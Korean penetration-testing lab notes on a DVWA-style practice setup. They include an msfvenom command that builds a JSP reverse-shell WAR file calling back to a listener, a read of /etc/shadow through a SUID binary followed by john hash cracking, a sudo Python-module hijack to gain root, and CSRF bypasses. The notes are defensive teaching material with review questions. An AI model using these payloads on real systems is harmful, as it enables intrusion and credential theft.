# 2026-10-01 · feroxbuster/fcrackzip · msfvenom(war) · SUID LFILE(shadow) · DVWA CSRF

> 원본: [original/Notes_261001_091632.pdf](original/Notes_261001_091632.pdf)
>
> ⚠️ 교육용 취약 실습/DVWA 대상. 방어 관점과 함께 정리. 실제 시스템 대상 사용 금지.

## 1. 추가 도구
| 도구 | 용도 |
|---|---|
| **feroxbuster** | 웹서버 디렉터리/콘텐츠 탐색(gobuster 유사, 재귀 스캔) |
| **fcrackzip** | zip 파일 비밀번호 무차별 크랙 |

## 2. msfvenom war 리버스 셸
```bash
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.16.120 LPORT=5555 \
     -f war -o revshell.war       # war 형식 reverse shell 생성
# → website(톰캣 등)에 업로드 후 접근 → 리버스 셸 연결
```

## 3. SUID 바이너리(look) + LFILE로 /etc/shadow 읽기
`look` 같은 SUID 프로그램이 LFILE 환경변수를 참조하면 임의 파일을 읽을 수 있다(GTFOBins 기법).
```bash
LFILE=/etc/shadow     # 읽을 대상
./look '' $LFILE      # SUID look으로 shadow 파일 읽기
```
- shadow의 해시(예: SHA-512)를 확보 → 크래킹.
```bash
# Kali
sudo john --wordlist=/usr/share/wordlists/rockyou.txt crhash.txt   # 또는 hashcat
```

## 4. 권한 상승 — 쓰기 가능한 파이썬 모듈 하이재킹
```bash
sudo -l       # random_base64.py 등을 root로 실행 가능 확인
# random_base64.py가 import하는 모듈(base64.py)에 bash 실행 코드를 넣기
# → sudo로 스크립트 실행 시 root 권한의 셸 생성
```
- 방어: `sudo` 대상 스크립트가 쓰기 가능한 경로의 모듈을 import하지 않도록, 모듈 경로 권한 점검.

## 5. DVWA — CSRF (Cross-Site Request Forgery)
공격자가 만든 요청을 피해자 브라우저가 (로그인 상태로) 대신 보내게 만드는 공격.

| 난이도 | 동작 / 우회 | 
|---|---|
| **low** | 비밀번호 변경이 GET 요청 방식 → `password_new`/`password_conf`를 쿼리스트링에 담아 전송. 관리자에게 해당 URL을 클릭하게 하면 비밀번호가 변경됨 |
| **medium** | **Referer 검증** 추가 → Referer 헤더를 맞춰 우회 |
| **high** | 요청마다 고유하게 변하는 **Anti-CSRF 토큰** 검증 수행 → 토큰 없이는 위조 불가 |

- 방어: **Anti-CSRF 토큰**(요청마다 unique), SameSite 쿠키, 민감 작업은 재인증, GET으로 상태변경 금지.

## 6. 복습 질문
1. CSRF low가 가능한 근본 원인(GET 상태변경)은 무엇인가?
2. Referer 검증(medium)이 완전한 방어가 아닌 이유는?
3. SUID 바이너리로 /etc/shadow를 읽을 수 있으면 무엇이 잘못된 설정인가?
4. Anti-CSRF 토큰이 위조를 막는 원리는?
